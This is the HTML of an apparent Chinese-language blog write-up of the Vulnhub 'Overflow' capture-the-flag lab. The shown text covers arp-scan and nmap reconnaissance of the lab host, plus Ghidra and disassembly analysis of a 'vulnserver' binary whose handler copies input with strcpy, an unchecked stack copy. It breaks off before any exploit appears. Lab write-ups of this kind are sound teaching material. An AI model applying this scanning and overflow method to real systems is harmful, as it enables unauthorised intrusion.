@@ -1,0 +1,942 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub-Overflow - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/overflow-1,300/ 目标 获取两个 flag，user / root。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 Ubuntu in docker 16.04.7 LTS 工具版本 名称 版本" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/2020-08-30-vulnhub-overflow/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub-Overflow" />
+<meta property="og:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/overflow-1,300/ 目标 获取两个 flag，user / root。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 Ubuntu in docker 16.04.7 LTS 工具版本 名称 版本" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/2020-08-30-vulnhub-overflow/" />
+<meta property="article:published_time" content="2020-08-30T17:31:18+00:00" />
+<meta property="article:modified_time" content="2020-08-30T17:31:18+00:00" />
+<meta itemprop="name" content="Vulnhub-Overflow">
+<meta itemprop="description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/overflow-1,300/ 目标 获取两个 flag，user / root。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 Ubuntu in docker 16.04.7 LTS 工具版本 名称 版本">
+<meta itemprop="datePublished" content="2020-08-30T17:31:18+00:00" />
+<meta itemprop="dateModified" content="2020-08-30T17:31:18+00:00" />
+<meta itemprop="wordCount" content="2744">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub-Overflow"/>
+<meta name="twitter:description" content="基本介绍 靶机地址 https://www.vulnhub.com/entry/overflow-1,300/ 目标 获取两个 flag，user / root。 环境 名称 介绍 主机 Manjaro 20.1 虚拟化软件 Virtualbox 6.1.12 靶机网络 Host-only (vboxnet0) kali in docker 2020.3 Ubuntu in docker 16.04.7 LTS 工具版本 名称 版本"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Even</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Even</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub-Overflow</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2020-08-30 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#基本介绍">基本介绍</a>
+          <ul>
+            <li><a href="#靶机地址">靶机地址</a></li>
+            <li><a href="#目标">目标</a></li>
+            <li><a href="#环境">环境</a></li>
+            <li><a href="#工具版本">工具版本</a></li>
+          </ul>
+        </li>
+        <li><a href="#信息收集">信息收集</a>
+          <ul>
+            <li><a href="#获取-ip-地址">获取 IP 地址</a></li>
+            <li><a href="#端口扫描">端口扫描</a></li>
+            <li><a href="#服务枚举">服务枚举</a></li>
+            <li><a href="#访问网页">访问网页</a></li>
+          </ul>
+        </li>
+        <li><a href="#vulnserver-分析">Vulnserver 分析</a>
+          <ul>
+            <li><a href="#文件信息">文件信息</a></li>
+            <li><a href="#静态分析">静态分析</a></li>
+            <li><a href="#动态调试">动态调试</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#gadgets-information">Gadgets information</a>
+      <ul>
+        <li><a href="#printauthlog-分析">printauthlog 分析</a>
+          <ul>
+            <li><a href="#静态分析-1">静态分析</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h2 id="基本介绍">基本介绍</h2>
+<h3 id="靶机地址">靶机地址</h3>
+<p><a href="https://www.vulnhub.com/entry/overflow-1,300/">https://www.vulnhub.com/entry/overflow-1,300/</a></p>
+<h3 id="目标">目标</h3>
+<p>获取两个 <strong>flag</strong>，user / root。</p>
+<h3 id="环境">环境</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">介绍</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">主机</td>
+<td style="text-align:left">Manjaro 20.1</td>
+</tr>
+<tr>
+<td style="text-align:left">虚拟化软件</td>
+<td style="text-align:left">Virtualbox 6.1.12</td>
+</tr>
+<tr>
+<td style="text-align:left">靶机网络</td>
+<td style="text-align:left">Host-only (vboxnet0)</td>
+</tr>
+<tr>
+<td style="text-align:left">kali in docker</td>
+<td style="text-align:left">2020.3</td>
+</tr>
+<tr>
+<td style="text-align:left">Ubuntu in docker</td>
+<td style="text-align:left">16.04.7 LTS</td>
+</tr>
+</tbody>
+</table>
+<h3 id="工具版本">工具版本</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">名称</th>
+<th style="text-align:left">版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">arp-scan</td>
+<td style="text-align:left">1.9.7</td>
+</tr>
+<tr>
+<td style="text-align:left">Nmap</td>
+<td style="text-align:left">7.80</td>
+</tr>
+<tr>
+<td style="text-align:left">Ghidra</td>
+<td style="text-align:left">9.1</td>
+</tr>
+<tr>
+<td style="text-align:left">IDA Pro</td>
+<td style="text-align:left">7.3</td>
+</tr>
+</tbody>
+</table>
+<h2 id="信息收集">信息收集</h2>
+<h3 id="获取-ip-地址">获取 IP 地址</h3>
+<p>使用 <strong>arp-scan</strong> 对 <strong>vboxnet0</strong> 接口进行二层扫描，可知靶机的地址为 <strong>192.168.56.121</strong>。</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">arp-scan -I vboxnet0 --localnet
+</code></pre></td></tr></table>
+</div>
+</div><p>arp-scan -I vboxnet0 &ndash;localnet
+Interface: vboxnet0, type: EN10MB, MAC: 0a:00:27:00:00:00, IPv4: 192.168.56.1
+Starting arp-scan 1.9.7 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)
+192.168.56.100	08:00:27:14:c7:34	PCS Systemtechnik GmbH
+192.168.56.121	08:00:27:37:66:a9	PCS Systemtechnik GmbH</p>
+<p>2 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 2.039 seconds (125.55 hosts/sec). 2 responded
+{% endblockquote %}</p>
+<h3 id="端口扫描">端口扫描</h3>
+<p>使用半连接方式对靶机进行全 TCP 端口扫描，该靶机只开放了两个端口：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sS -p- 192.168.56.121
+</code></pre></td></tr></table>
+</div>
+</div><p>Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-08-26 04:33 UTC
+Nmap scan report for 192.168.56.121
+Host is up (0.00014s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+1337/tcp open  waste
+MAC Address: 08:00:27:37:66:A9 (Oracle VirtualBox virtual NIC)</p>
+<p>Nmap done: 1 IP address (1 host up) scanned in 1.14 seconds
+{% endblockquote %}</p>
+<h3 id="服务枚举">服务枚举</h3>
+<p>继续使用 Nmap 进行服务枚举，可见 80 端口上运行着 <strong>apache</strong>；而另一个端口就比较奇怪了，并看不出是什么。</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sV -sC -p80,1337 192.168.56.121
+</code></pre></td></tr></table>
+</div>
+</div><p>Starting Nmap 7.80 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2020-08-26 04:34 UTC
+Nmap scan report for 192.168.56.121
+Host is up (0.00038s latency).</p>
+<p>PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
+|_http-server-header: Apache/2.4.25 (Debian)
+|<em>http-title: Site doesn&rsquo;t have a title (text/html).
+1337/tcp open  waste?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+|     COMMAND : TRY HARDER!
+|   NULL:
+|</em>    COMMAND :
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :
+SF-Port1337-TCP:V=7.80%I=7%D=8/26%Time=5F45E660%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,A,&ldquo;COMMAND\x20:\x20&rdquo;)%r(GenericLines,16,&ldquo;COMMAND\x20:\x20TRY\x20HARD
+SF:ER!\n&rdquo;)%r(GetRequest,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(HTTPOptio
+SF:ns,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(RTSPRequest,16,&ldquo;COMMAND\x20
+SF::\x20TRY\x20HARDER!\n&rdquo;)%r(RPCCheck,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n
+SF:&quot;)%r(DNSVersionBindReqTCP,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(DNSS
+SF:tatusRequestTCP,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(Help,16,&ldquo;COMMA
+SF:ND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(SSLSessionReq,16,&ldquo;COMMAND\x20:\x20TRY\x
+SF:20HARDER!\n&rdquo;)%r(TerminalServerCookie,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!
+SF:\n&rdquo;)%r(TLSSessionReq,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(Kerberos,
+SF:16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(SMBProgNeg,16,&ldquo;COMMAND\x20:\x2
+SF:0TRY\x20HARDER!\n&rdquo;)%r(X11Probe,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r
+SF:(FourOhFourRequest,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(LPDString,1
+SF:6,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(LDAPSearchReq,16,&ldquo;COMMAND\x20:<br>
+SF:x20TRY\x20HARDER!\n&rdquo;)%r(LDAPBindReq,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!<br>
+SF:n&rdquo;)%r(SIPOptions,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(LANDesk-RC,16
+SF:,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(TerminalServer,16,&ldquo;COMMAND\x20:<br>
+SF:x20TRY\x20HARDER!\n&rdquo;)%r(NCP,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(No
+SF:tesRPC,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(JavaRMI,16,&ldquo;COMMAND\x20
+SF::\x20TRY\x20HARDER!\n&rdquo;)%r(WMSRequest,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!
+SF:\n&rdquo;)%r(oracle-tns,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(ms-sql-s,16,
+SF:&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;)%r(afp,16,&ldquo;COMMAND\x20:\x20TRY\x20HA
+SF:RDER!\n&rdquo;)%r(giop,16,&ldquo;COMMAND\x20:\x20TRY\x20HARDER!\n&rdquo;);
+MAC Address: 08:00:27:37:66:A9 (Oracle VirtualBox virtual NIC)</p>
+<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .
+Nmap done: 1 IP address (1 host up) scanned in 158.02 seconds
+{% endblockquote %}</p>
+<h3 id="访问网页">访问网页</h3>
+<p>在浏览器中访问 <a href="http://192.168.56.121">http://192.168.56.121</a>，页面中只有一句话：</p>
+<p><img src="/images/2020-08-30/index.webp" alt="index"></p>
+<p>相当简洁明了，得到了 1337 端口上运行的程序 <strong>vulnserver</strong>，不用继续枚举 Web 了。</p>
+<h2 id="vulnserver-分析">Vulnserver 分析</h2>
+<h3 id="文件信息">文件信息</h3>
+<p>首先查看这个文件的基本信息：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">file vulnserver
+</code></pre></td></tr></table>
+</div>
+</div><p>vulnserver: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=22c480f83765e0d4ca860fe9469074ba8f17295c, not stripped
+{% endblockquote %}</p>
+<p>可见是一个 32 位的动态链接 ELF 文件，没有剥离调试信息，继续查看防护措施：</p>
+<p>{% blockquote %}</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">checksec --file<span class="o">=</span>vulnserver
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/2020-08-30/vs_check.webp" alt="vs_check">
+{% endblockquote %}</p>
+<p>没有任何防护！</p>
+<h3 id="静态分析">静态分析</h3>
+<p>这里我是用 <strong>Ghidra</strong> 来进行反汇编和反编译，直接看 <strong>main</strong> 函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="n">puStack20</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">stack0x00000004</span><span class="p">;</span>
+<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-]Error in connection.&#34;</span><span class="p">);</span>
+                  <span class="cm">/* WARNING: Subroutine does not return */</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+]Server Socket is created.&#34;</span><span class="p">);</span>
+<span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_40</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+<span class="n">local_40</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+<span class="n">local_3e</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mh">0x539</span><span class="p">);</span>
+<span class="n">local_3c</span> <span class="o">=</span> <span class="n">inet_addr</span><span class="p">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="p">);</span>
+<span class="n">local_28</span> <span class="o">=</span> <span class="n">bind</span><span class="p">(</span><span class="n">sock</span><span class="p">,(</span><span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">local_40</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">local_28</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-]Error in binding.&#34;</span><span class="p">);</span>
+                  <span class="cm">/* WARNING: Subroutine does not return */</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+]Bind to port %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mh">0x539</span><span class="p">);</span>
+<span class="n">iVar2</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[+]Listening....&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[-]Error in binding.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>从以上的代码可知该程序创建了一个 TCP 套接字，监听本地的 1337(0x539) 端口，最多能同时建立 10 条连接。接着分析：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+  <span class="n">client</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sock</span><span class="p">,(</span><span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="n">local_50</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_54</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">client</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">local_4e</span><span class="p">);</span>
+  <span class="n">pcVar3</span> <span class="o">=</span> <span class="n">inet_ntoa</span><span class="p">(</span><span class="n">local_4c</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Connection accepted from %s:%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">pcVar3</span><span class="p">,(</span><span class="n">uint</span><span class="p">)</span><span class="n">uVar1</span><span class="p">);</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">write</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="s">&#34;COMMAND : &#34;</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+    <span class="n">recv</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="n">local_454</span><span class="p">,</span><span class="mh">0x400</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+    <span class="n">iVar2</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="s">&#34;OVERFLOW &#34;</span><span class="p">,</span><span class="n">local_454</span><span class="p">,</span><span class="mi">9</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">handleCommand</span><span class="p">(</span><span class="n">local_454</span><span class="p">);</span>
+      <span class="n">write</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="s">&#34;COMMAND DONE</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mh">0xd</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">write</span><span class="p">(</span><span class="n">client</span><span class="p">,</span><span class="s">&#34;TRY HARDER!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="mh">0xc</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>该程序使用了 <strong>fork</strong> 的方式来处理连接的请求，对于每个连接，先读取最多 1024 个字节（0x400），如果以 &ldquo;OVERFLOW &ldquo;（<strong>注意有一个空格</strong>）打头，则调用 <strong>handleCommand</strong> 函数进一步处理。<strong>handle</strong> 函数如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">55</span>              <span class="nf">PUSH</span>       <span class="no">EBP</span>
+<span class="err">89</span> <span class="nf">e5</span>           <span class="no">MOV</span>        <span class="no">EBP</span><span class="p">,</span><span class="no">ESP</span>
+<span class="err">53</span>              <span class="nf">PUSH</span>       <span class="no">EBX</span>
+<span class="err">83</span> <span class="nf">ec</span> <span class="mi">24</span>        <span class="no">SUB</span>        <span class="no">ESP</span><span class="p">,</span><span class="mi">0x24</span>
+<span class="nf">e8</span> <span class="mi">6</span><span class="no">e</span> <span class="mi">02</span>        <span class="no">CALL</span>       <span class="no">__x86.get_pc_thunk.ax</span>                <span class="no">undefined</span> <span class="no">__x86.get_pc_thunk.ax</span><span class="p">()</span>
+<span class="err">00</span> <span class="err">00</span>
+<span class="err">05</span> <span class="err">92</span> <span class="err">2</span><span class="nf">d</span>        <span class="no">ADD</span>        <span class="no">EAX</span><span class="p">,</span><span class="mi">0x2d92</span>
+<span class="err">00</span> <span class="err">00</span>
+<span class="err">83</span> <span class="nf">ec</span> <span class="mi">08</span>        <span class="no">SUB</span>        <span class="no">ESP</span><span class="p">,</span><span class="mi">0x8</span>
+<span class="nf">ff</span> <span class="mi">75</span> <span class="mi">08</span>        <span class="no">PUSH</span>       <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">EBP</span> <span class="err">+</span> <span class="no">param_1</span><span class="p">]</span>
+<span class="err">8</span><span class="nf">d</span> <span class="mi">55</span> <span class="no">d8</span>        <span class="no">LEA</span>        <span class="no">EDX</span><span class="err">=&gt;</span><span class="no">local_2c</span><span class="p">,[</span><span class="no">EBP</span> <span class="err">+</span> <span class="p">-</span><span class="mi">0x28</span><span class="p">]</span>
+<span class="err">52</span>              <span class="nf">PUSH</span>       <span class="no">EDX</span>
+<span class="err">89</span> <span class="nf">c3</span>           <span class="no">MOV</span>        <span class="no">EBX</span><span class="p">,</span><span class="no">EAX</span>
+<span class="nf">e8</span> <span class="no">ec</span> <span class="no">fd</span>        <span class="no">CALL</span>       <span class="no">strcpy</span>                               <span class="no">char</span> <span class="p">*</span> <span class="no">strcpy</span><span class="p">(</span><span class="no">char</span> <span class="p">*</span> <span class="no">__dest</span><span class="p">,</span> <span class="no">cha</span>
+<span class="nf">ff</span> <span class="no">ff</span>
+<span class="err">83</span> <span class="nf">c4</span> <span class="mi">10</span>        <span class="no">ADD</span>        <span class="no">ESP</span><span class="p">,</span><span class="mi">0x10</span>
+<span class="err">90</span>              <span class="nf">NOP</span>
+<span class="err">8</span><span class="nf">b</span> <span class="mi">5</span><span class="no">d</span> <span class="no">fc</span>        <span class="no">MOV</span>        <span class="no">EBX</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">EBP</span> <span class="err">+</span> <span class="no">local_8</span><span class="p">]</span>
